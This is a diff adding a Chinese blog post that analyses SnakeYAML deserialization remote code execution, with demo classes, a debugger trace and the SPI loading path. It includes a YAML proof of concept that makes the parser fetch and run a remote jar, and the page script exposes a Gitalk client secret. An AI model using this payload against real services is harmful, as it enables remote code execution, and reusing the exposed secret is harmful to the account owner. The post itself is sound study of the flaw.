@@ -1,0 +1,544 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>初探snakeYaml反序列化 | Le1a的菜园坝</title>
+<link rel="shortcut icon" href="https://le1a.github.io/favicon.ico?v=1695699802917">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://le1a.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="初探snakeYaml反序列化 | Le1a的菜园坝 - Atom Feed" href="https://le1a.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-W25ZHLT37K"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-W25ZHLT37K');
+</script>
+
+
+    <meta name="description" content="0x00前言
+前几天🐑了，所以这段时间也没有学习。今天快好了，抓紧来学一下🙃🙃🙃
+0x01漏洞原理
+yaml反序列化时可以通过!!+全类名指定反序列化的类，反序列化过程中会实例化该类，可以通过构造ScriptEngineManage..." />
+    <meta name="keywords" content="SnakeYaml,Java,反序列化" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://le1a.github.io">
+  <img class="avatar" src="https://le1a.github.io/images/avatar.png?v=1695699802917" alt="">
+  </a>
+  <h1 class="site-title">
+    Le1a的菜园坝
+  </h1>
+  <p class="site-description">
+    欢迎来到菜园坝~~~
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends/" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about/" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/Le1a/" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/Le1aaaaa" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              初探snakeYaml反序列化
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-12-26
+              </span>
+              <span>
+                10 min read
+              </span>
+              
+                <a href="https://le1a.github.io/tag/snakeyaml/" class="post-tag">
+                  # SnakeYaml
+                </a>
+              
+                <a href="https://le1a.github.io/tag/iOb8V69L9/" class="post-tag">
+                  # Java
+                </a>
+              
+                <a href="https://le1a.github.io/tag/Jb2lgvYBPU/" class="post-tag">
+                  # 反序列化
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="0x00前言">0x00前言</h1>
+<p>前几天🐑了，所以这段时间也没有学习。今天快好了，抓紧来学一下🙃🙃🙃</p>
+<h1 id="0x01漏洞原理">0x01漏洞原理</h1>
+<p>yaml反序列化时可以通过<code>!!</code>+全类名指定反序列化的类，反序列化过程中会实例化该类，可以通过构造<code>ScriptEngineManager</code>payload并利用SPI机制通过<code>URLClassLoader</code>或者其他payload如JNDI方式远程加载实例化恶意类从而实现任意代码执行。</p>
+<h1 id="0x02环境">0x02环境</h1>
+<p>jdk：8u301</p>
+<p>maven：</p>
+<pre><code class="language-xml">&lt;!-- https://mvnrepository.com/artifact/org.yaml/snakeyaml --&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;org.yaml&lt;/groupId&gt;
+    &lt;artifactId&gt;snakeyaml&lt;/artifactId&gt;
+    &lt;version&gt;1.27&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<h1 id="0x03序列化与反序列化">0x03序列化与反序列化</h1>
+<p>SnakeYaml提供了Yaml.dump()和Yaml.load()两个函数来实现<code>yaml格式数据</code>和<code>对象</code>之间相互转化。</p>
+<ul>
+<li>Yaml.dump() : 将对象转化为yaml格式的数据</li>
+<li>Yaml.load():     将传入的字符串或文件，反序列化为对象</li>
+</ul>
+<h2 id="序列化">序列化</h2>
+<pre><code class="language-java">package com.le1a.snakeyaml.user;
+
+public class User {
+    public String name;
+
+    public void setName(String name) {
+        this.name = name;
+    }
+
+    public String getName() {
+        return name;
+    }
+}
+</code></pre>
+<pre><code class="language-java">package com.le1a.snakeyaml.controller;
+
+import com.le1a.snakeyaml.user.User;
+import com.le1a.snakeyaml.user.User2;
+import org.yaml.snakeyaml.Yaml;
+
+public class SankeYamlDemo {
+    public static void main(String[] args) {
+        Serialize();
+    }
+
+
+    public static void Serialize(){
+        User user = new User();
+        user.setName(&quot;Le1aaaaa&quot;);
+        Yaml yaml = new Yaml();
+        String dump = yaml.dump(user);
+        System.out.println(dump);
+    }
+  //打印输出!!com.le1a.snakeyaml.user.User {name: Le1aaaaa}
+</code></pre>
+<p>这里的<code>!!</code>类似于<code>Fastjson</code>中的<code>@type</code>，用来指定想要反序列化成为的对象。</p>
+<h2 id="反序列化">反序列化</h2>
+<p>我们可以通过构造一个新的User类，来看反序列化的过程会调用哪些方法。</p>
+<pre><code class="language-java">package com.le1a.snakeyaml.user;
+
+public class User2 {
+
+    String name;
+    int age;
+
+    public User2() {
+        System.out.println(&quot;User构造函数&quot;);
+    }
+
+    public String getName() {
+        System.out.println(&quot;User.getName&quot;);
+        return name;
+    }
+
+    public void setName(String name) {
+        System.out.println(&quot;User.setName&quot;);
+        this.name = name;
+    }
+
+    public String getAge() {
+        System.out.println(&quot;User.getAge&quot;);
+        return name;
+    }
+
+    public void setAge(String name) {
+        System.out.println(&quot;User.setAge&quot;);
+        this.name = name;
+    }
+
+}
+</code></pre>
+<pre><code class="language-java">package com.le1a.snakeyaml.controller;
+
+import com.le1a.snakeyaml.user.User;
+import com.le1a.snakeyaml.user.User2;
+import org.yaml.snakeyaml.Yaml;
+
+public class SankeYamlDemo {
+    public static void main(String[] args) {
+        Deserialize();
+    }
+
+
+    public static void Serialize(){
+        User user = new User();
+        user.setName(&quot;Le1aaaaa&quot;);
+        Yaml yaml = new Yaml();
+        String dump = yaml.dump(user);
+        System.out.println(dump);
+    }
+
+    public static void Deserialize(){
+        String s = &quot;!!com.le1a.snakeyaml.user.User2 {name: Le1aaaa, age: 18}&quot;;
+        Yaml yaml = new Yaml();
+        User2 user2 = yaml.load(s);
+
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/26/60f7f0c2be214.png" alt="1672042752685.png" loading="lazy"></figure>
+<p>发现会调用对象的构造函数和Set方法。</p>
+<h1 id="0x04-snakeyaml反序列化漏洞">0x04 snakeYaml反序列化漏洞</h1>
+<h2 id="漏洞复现">漏洞复现</h2>
+<p>既然反序列化还原对象的过程中，会调用构造函数，那么我们构造一个恶意的对象，是否可以命令执行呢？</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/26/f5b5461f4beb2.png" alt="1672043129691.png" loading="lazy"></figure>
+<p>答案是可以的，但是本地肯定不会存在这样的恶意类。我们可以通过<code>javax.script.ScriptEngineManager</code>的利用链通过<code>URLClassLoader</code>实现的代码执行。</p>
+<p>GitHub有现成的项目: https://github.com/artsploit/yaml-payload，打成jar包之后，然后起一个http服务。</p>
+<p>使用如下poc：</p>
+<pre><code class="language-yaml">!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL [&quot;http://127.0.0.1:8000/yaml-payload.jar&quot;]
+  ]]
+]
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/26/12e9fc621c24f.png" alt="1672043288408.png" loading="lazy"></figure>
+<h2 id="调试分析">调试分析</h2>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/26/002dd21f644b4.png" alt="1672043812458.png" loading="lazy"></figure>
+<p>首先会调用<code>StreamReader</code>，跟进看一下。首先进入了上面的<code>StreamReader</code>，然后走到下面进行了一些赋值操作。</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/26/b7eb0dac42075.png" alt="1672044051681.png" loading="lazy"></figure>
+<p>然后走到了<code>loadFromReader</code></p>
+<pre><code class="language-java">private Object loadFromReader(StreamReader sreader, Class&lt;?&gt; type) {
+    Composer composer = new Composer(new ParserImpl(sreader), this.resolver, this.loadingConfig);
+    this.constructor.setComposer(composer);
+    return this.constructor.getSingleData(type);
+}
+</code></pre>
+<p>他把<code>StreamReader</code>封装成了一个<code>Composer</code>对象，其中payload被封装在了<code>composer-&gt;parser-&gt;scanner-&gt;reader-&gt;stream-&gt;str</code>当中</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/26/b0a631fedfa28.png" alt="1672044349528.png" loading="lazy"></figure>
+<p>在这个过程中，实例化了<code>ParserImpl</code></p>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/26/7a867398bc4f9.png" alt="1672044579940.png" loading="lazy"></figure>
+<p>然后走到同名方法中</p>
+<pre><code class="language-java">public ParserImpl(Scanner scanner) {
+    this.scanner = scanner;
+    this.currentEvent = null;
+    this.directives = new VersionTagsTuple((DumperOptions.Version)null, new HashMap(DEFAULT_TAGS));
+    this.states = new ArrayStack(100);
+    this.marks = new ArrayStack(10);
+    this.state = new ParseStreamStart();
+}
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/26/7d7657b80ba98.png" alt="1672044718405.png" loading="lazy"></figure>
+<p>这里需要注意这个<code>!! -&gt; tag:yaml.org,2002:</code></p>
+<p>之后调用<code>constructor.setComposer()</code>对封装好的<code>composer</code>对象赋值，最后走到<code>constructor.getSingleData()</code>方法中，然后调用<code>getSingleNode()</code>，这个方法会对payload进行处理把<code>!!</code>变成<code>tag</code>一类的标识</p>
+<pre><code class="language-java">public Object getSingleData(Class&lt;?&gt; type) {
+    Node node = this.composer.getSingleNode();
+    if (node != null &amp;&amp; !Tag.NULL.equals(node.getTag())) {
+        if (Object.class != type) {
+            node.setTag(new Tag(type));
+        } else if (this.rootTag != null) {
+            node.setTag(this.rootTag);
+        }
+
+        return this.constructDocument(node);
+    } else {
+        Construct construct = (Construct)this.yamlConstructors.get(Tag.NULL);
+        return construct.construct(node);
+    }
+}
+</code></pre>
+<pre><code class="language-java">public Node getSingleNode() {
+    this.parser.getEvent();
+    Node document = null;
+    if (!this.parser.checkEvent(ID.StreamEnd)) {
+        document = this.getNode();
+    }
+
+    if (!this.parser.checkEvent(ID.StreamEnd)) {
+        Event event = this.parser.getEvent();
+        Mark contextMark = document != null ? document.getStartMark() : null;
+        throw new ComposerException(&quot;expected a single document in the stream&quot;, contextMark, &quot;but found another document&quot;, event.getStartMark());
+    } else {
+        this.parser.getEvent();
+        return document;
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/26/bd92806320ec2.png" alt="1672045069292.png" loading="lazy"></figure>
+<p>tag具体的替换和payload重新组合的逻辑在<code>ParserImpl#parseNode()</code></p>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/26/682e9a516b7fb.png" alt="1672046238339.png" loading="lazy"></figure>
+<p>现在payload就变成了</p>
+<pre><code class="language-yaml">&lt;org.yaml.snakeyaml.nodes.SequenceNode (tag=tag:yaml.org,2002:javax.script.ScriptEngineManager, value=[&lt;org.yaml.snakeyaml.nodes.SequenceNode (tag=tag:yaml.org,2002:java.net.URLClassLoader, value=[&lt;org.yaml.snakeyaml.nodes.SequenceNode (tag=tag:yaml.org,2002:seq, value=[&lt;org.yaml.snakeyaml.nodes.SequenceNode (tag=tag:yaml.org,2002:java.net.URL, value=[&lt;org.yaml.snakeyaml.nodes.ScalarNode (tag=tag:yaml.org,2002:str, value=http://127.0.0.1:8000/yaml-payload.jar)&gt;])&gt;])&gt;])&gt;])&gt;
+</code></pre>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/26/940329099373f.png" alt="1672046982200.png" loading="lazy"></figure>
+<p>最后把数据返回给<code>constructDocument(node);</code></p>
+<figure data-type="image" tabindex="12"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/26/9105d2cc31327.png" alt="1672047107046.png" loading="lazy"></figure>
+<p>继续跟进<code>constructObject(node)</code></p>
+<pre><code class="language-java">protected Object constructObject(Node node) {
+    return this.constructedObjects.containsKey(node) ? this.constructedObjects.get(node) : this.constructObjectNoCheck(node);
+}
+</code></pre>
+<p>再继续跟进到<code>constructObjectNoCheck(node)</code></p>
+<pre><code class="language-java">protected Object constructObjectNoCheck(Node node) {
+    if (this.recursiveObjects.contains(node)) {
+        throw new ConstructorException((String)null, (Mark)null, &quot;found unconstructable recursive node&quot;, node.getStartMark());
+    } else {
+        this.recursiveObjects.add(node);
+        Construct constructor = this.getConstructor(node);
+        Object data = this.constructedObjects.containsKey(node) ? this.constructedObjects.get(node) : constructor.construct(node);
+        this.finalizeConstruction(node, data);
+        this.constructedObjects.put(node, data);
+        this.recursiveObjects.remove(node);
+        if (node.isTwoStepsConstruction()) {
+            constructor.construct2ndStep(node, data);
+        }
+
+        return data;
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/26/23f15e7ed31bd.png" alt="1672047478690.png" loading="lazy"></figure>
+<p>这两个值为空，所以执行<code>constructor.construct(node)</code>，继续跟进</p>
+<pre><code class="language-java">public Object construct(Node node) {
+    try {
+        return this.getConstructor(node).construct(node);
+    } catch (ConstructorException var3) {
+        throw var3;
+    } catch (Exception var4) {
+        throw new ConstructorException((String)null, (Mark)null, &quot;Can't construct a java object for &quot; + node.getTag() + &quot;; exception=&quot; + var4.getMessage(), node.getStartMark(), var4);
+    }
+}
+</code></pre>
+<p>继续跟进<code>getConstructor(node).construct(node)</code></p>
+<pre><code class="language-java">for(i$ = snode.getValue().iterator(); i$.hasNext(); argumentListx[index++] = Constructor.this.constructObject(argumentNode)) {
+    argumentNode = (Node)i$.next();
+    Class&lt;?&gt; type = c.getParameterTypes()[index];
+    argumentNode.setType(type);
+}
+</code></pre>
+<p>跟进<code>constructObject(argumentNode)</code>，相当于又重新调用了</p>
+<pre><code class="language-cmd">constructObjectNoCheck()-&gt;
+BaseConstructor#construct()-&gt;
+Contructor#construct()-&gt;
+通过迭代Contructor#constructObject()
+</code></pre>
+<p>执行constructObject()后，接着又回去了，连续执行四次，直到<code>recursiveObjects</code>中包含刚才提到的五条值。</p>
+<p>最终通过<code>newInstance</code>方法实例化，这里具体的话分为3步，首先是<code>URL</code>的实例化，之后是<code>URLClassLoader</code>的实例化，最终实例化<code>ScriptEngineManager</code>时才会真正的触发远程代码执行。</p>
+<h1 id="0x05-spi机制">0x05 SPI机制</h1>
+<p>什么是SPI？让我们来看看网上是怎么说的：</p>
+<p>SPI全称为 (Service Provider Interface)，是JDK内置的一种服务提供发现机制。SPI是一种动态替换发现的机制，一种解耦非常优秀的思想。</p>
+<p>SPI的工作原理： 就是ClassPath路径下的META-INF/services文件夹中， 以接口的全限定名来命名文件名，文件里面写该接口的实现。然后再资源加载的方式，读取文件的内容(接口实现的全限定名)， 然后再去加载类。</p>
+<p>说简单一点就是：<code>SPI机制可以让我们调用接口，然后通过服务配置的方式寻找实现类并调用</code></p>
+<figure data-type="image" tabindex="14"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/01/b38d82a987c8a.png" alt="1672559918741.png" loading="lazy"></figure>
+<p>本次使用的payload也是如此，他实现了<code>ScriptEngineFactory</code>接口</p>
+<figure data-type="image" tabindex="15"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/01/8a1465d1d85f2.png" alt="1672560230926.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="16"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/01/1264495d356f5.png" alt="1672560367131.png" loading="lazy"></figure>
+<p>程序会通过<code>java.util.ServiceLoder</code>动态装载实现模块，在<code>META-INF/services</code>目录下的配置文件寻找实现类的类名，通过<code>Class.forName</code>加载进来,<code>newInstance()</code>创建对象,并存到缓存和列表里面。</p>
+<figure data-type="image" tabindex="17"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/01/03fe7bdf4c5ab.png" alt="1672561786739.png" loading="lazy"></figure>
+<p>继续跟进<code>init(loader);</code></p>
+<figure data-type="image" tabindex="18"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/01/e0d5a6dcdad14.png" alt="1672561883332.png" loading="lazy"></figure>
+<p>继续跟进<code>initEngines(loader);</code></p>
+<figure data-type="image" tabindex="19"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/01/4870cfbf642cb.png" alt="1672562651292.png" loading="lazy"></figure>
+<p>这里会返回一个<code>ServiceLoader</code>，它就用到了SPI机制，通过远程地址寻找<code>META-INF/services</code>目录下的<code>javax.script.ScriptEngineFactory</code>然后去加载文件中指定的PoC类从而触发远程代码执行。</p>
+<figure data-type="image" tabindex="20"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/01/d0442e014be07.png" alt="1672562887306.png" loading="lazy"></figure>
+<p>下面走到<code>itr.next();</code>继续跟进</p>
+<figure data-type="image" tabindex="21"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/01/7bfd70d0e6d4f.png" alt="1672563174427.png" loading="lazy"></figure>
+<p>继续跟进，走到<code>ServiceLoader$LazyIterator#next()</code></p>
+<figure data-type="image" tabindex="22"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/01/687230eede626.png" alt="1672563262077.png" loading="lazy"></figure>
+<p>这里调用了<code>nextService()</code>，继续跟进</p>
+<figure data-type="image" tabindex="23"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/01/7fda717aeeeb4.png" alt="1672563394363.png" loading="lazy"></figure>
+<p>这里反射获取了<code>jdk.nashorn.api.scripting.NashornScriptEngineFactory</code>，然后在后面进行了<code>newInstance</code>实例化。</p>
+<p>然后继续跟进就会进行一次循环，进行第二次反射&amp;实例化jar包中的PoC类<code>AwesomeScriptEngineFactory</code></p>
+<figure data-type="image" tabindex="24"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/01/46697404160b7.png" alt="1672563709319.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="25"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/01/01/ba2e47f386dbc.png" alt="1672565115663.png" loading="lazy"></figure>
+<p>最终触发<code>AwesomeScriptEngineFactory</code>类的无参构造方法的恶意代码。</p>
+<h1 id="0x06-其他手法">0x06 其他手法</h1>
+<h2 id="c3p0">C3P0</h2>
+<p>用到<code>C3P0.WrapperConnectionPoolDataSource</code>通过Hex序列化字节加载器达到二次反序列化</p>
+<h2 id="scriptenginemanager">ScriptEngineManager</h2>
+<p>把恶意jar包写入进去，然后file协议加载本地jar</p>
+<h1 id="0x07-参考">0x07 参考</h1>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#0x00%E5%89%8D%E8%A8%80">0x00前言</a></li>
+<li><a href="#0x01%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">0x01漏洞原理</a></li>
+<li><a href="#0x02%E7%8E%AF%E5%A2%83">0x02环境</a></li>
+<li><a href="#0x03%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">0x03序列化与反序列化</a>
+<ul>
+<li><a href="#%E5%BA%8F%E5%88%97%E5%8C%96">序列化</a></li>
+<li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">反序列化</a></li>
+</ul>
+</li>
+<li><a href="#0x04-snakeyaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">0x04 snakeYaml反序列化漏洞</a>
+<ul>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">漏洞复现</a></li>
+<li><a href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90">调试分析</a></li>
+</ul>
+</li>
+<li><a href="#0x05-spi%E6%9C%BA%E5%88%B6">0x05 SPI机制</a></li>
+<li><a href="#0x06-%E5%85%B6%E4%BB%96%E6%89%8B%E6%B3%95">0x06 其他手法</a>
+<ul>
+<li><a href="#c3p0">C3P0</a></li>
+<li><a href="#scriptenginemanager">ScriptEngineManager</a></li>
+</ul>
+</li>
+<li><a href="#0x07-%E5%8F%82%E8%80%83">0x07 参考</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://le1a.github.io/post/AnnualReportOf2022/">
+              <h3 class="post-title">
+                2022年终总结
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '883f90be69914455ab35',
+    clientSecret: '11fe2e13c68d9461524a00a6ad7ba52b6bc6b49b',
+    repo: 'Le1a.github.io',
+    owner: 'Le1a',
+    admin: ['Le1a'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://le1a.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
